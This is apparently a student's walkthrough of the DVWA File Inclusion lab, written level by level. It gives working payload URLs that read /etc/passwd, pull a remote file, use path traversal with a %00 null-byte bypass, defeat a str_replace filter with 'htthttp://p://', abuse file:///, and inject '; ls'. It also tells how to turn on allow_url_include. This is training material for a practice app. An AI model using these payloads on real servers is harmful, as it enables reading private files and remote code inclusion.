# DVWA - File Inclusion Solution

## Turn on the allow_url_include
> Use `find /opt -name php.ini` to find the config in the /opt.
> And change the "allow_url_include" to `allow_url_include = on`.
> Then restart the lampp using `/opt/lampp/lampp restart`.

> `/opt/lampp/htdocs/DVWA-master/php.ini`
```
magic_quotes_gpc = Off
allow_url_fopen = on
allow_url_include = on
```
> `/opt/lampp/etc/php.ini`
```
; Whether to allow include/require to open URLs (like http:// or ftp://) as files.
; http://php.net/allow-url-include
allow_url_include=On
```

## Low level
> We can see the source code, the web doesn't filter the URL, so we can change the URL to get any file in this server.
> 
> ![](https://i.imgur.com/34TAw1f.png)

> Let's try to change the URL to get some sensitive file in this server. ex(http://192.168.1.66/DVWA-master/vulnerabilities/fi/?page=/etc/passwd)
> 
> ![](https://i.imgur.com/mGlGUbO.png)

> Or we can use the command infection to list the file in this folder using `; ls ../fi`. We can see there is a file not showed in File Inclusion.
> 
> ![](https://i.imgur.com/O6lxmpc.png)

> And use the `http://192.168.1.66/DVWA-master/vulnerabilities/fi/?page=file4.php` to get the context of file.
> 
> ![](https://i.imgur.com/xSOQ3JW.png)

> You also can read the file on another server use the following URL.
> `http://192.168.1.66/DVWA-master/vulnerabilities/fi/?page=http://192.168.1.66/test.html`
> ![](https://i.imgur.com/l82nuf7.png)


> P.S.
> Before PHP Ver. 5.45 and `Magic_quote_gpc` is turned off the following URL is the same.
> After Ver. 5.45 the function `Magic_quote_gpc` is deleted.
> `http://192.168.1.66/DVWA/vulnerabilities/fi/?page=..\..\..\..\WWW\DVWA\php.ini`
`http://192.168.1.66/DVWA/vulnerabilities/fi/?page=..\..\..\..\WWW\DVWA\php.ini%0012.php`
> If the URL be requested need to end of .php we can use `%00` to bypass.
> 

## Medium level
> We can see the following coe, it let the `http://` and `https://` to be `""` so it seem can filter the get the remote file. However, we can use `htthttp://p://` to bypass.
```php
$file = str_replace( array( "http://", "https://" ), "", $file );
```
> And the following code is let the user can't use the relative path to get the file, but we can still use the absolute path to read the file.
> 
> Like the following figure: 
> 
> ![](https://i.imgur.com/YM8jw73.png)


## High level 
> We can see the source code, it filter the URL the URL after page need to start at `file`. So, we can use the`file:///` to bypass.
> Use `http://192.168.1.66/DVWA-master/vulnerabilities/fi/?page=file:////etc/passwd`
> 
> ![](https://i.imgur.com/Wbgu88l.png)


## Impossible level 
> In this level the web set the whitelist if the file we want to get is not in the `include.php` it will not work.
> So we da not hvae the way to attack.
> 
> ![](https://i.imgur.com/yHxVRns.png)



